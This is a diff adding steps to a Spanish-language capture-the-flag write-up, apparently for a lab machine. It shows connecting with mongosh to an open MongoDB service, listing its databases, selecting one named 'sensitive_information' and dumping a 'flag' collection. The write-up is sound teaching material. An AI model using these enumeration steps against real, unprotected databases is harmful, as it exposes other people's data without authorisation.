@@ -14,4 +14,35 @@ $ sudo apt-get install -y mongodb-mongosh
 ```bash
 $ mongosh 10.129.76.217
 ```
+![conexion_mongo](img/mongo_db_1.png)
+
+<br>Ahora, enumeraremos las bases de datos que el servicio de MongoDB tiene disponibles:
+```bash
+test> show dbs
+```
+![mostrar_base_de_datos](img/mongo_db_2.png)
+
+<br>Una base de datos en concreto parece especialmente interesante. La seleccionaremos para poderla enumerar más adelante:
+```bash
+test> use sensitive_information
+```
+![seleccionar_base_de_datos](img/mongo_db_3.png)
+
+<br>Ahora, realizaremos un volcado de las colecciones de las que consta la base de datos "sensitive_information":
+```bash
+sensitive_information> show collections
+```
+![colecciones](img/mongo_db_4.png)
+
+<br>Finalmente, podemos obtener todos los documentos que componen la colección ejecutando el siguiente comando (añadir .pretty() lo que permite es que el resultado devuelto sea más fácilmente leíble):
+```bash
+sensitive_information> db.flag.find().pretty()
+```
+![flag](img/mongo_db_5.png)
+
+<br>Y con esto obtendríamos la ansiada flag 😃.
+
+
+
+
 
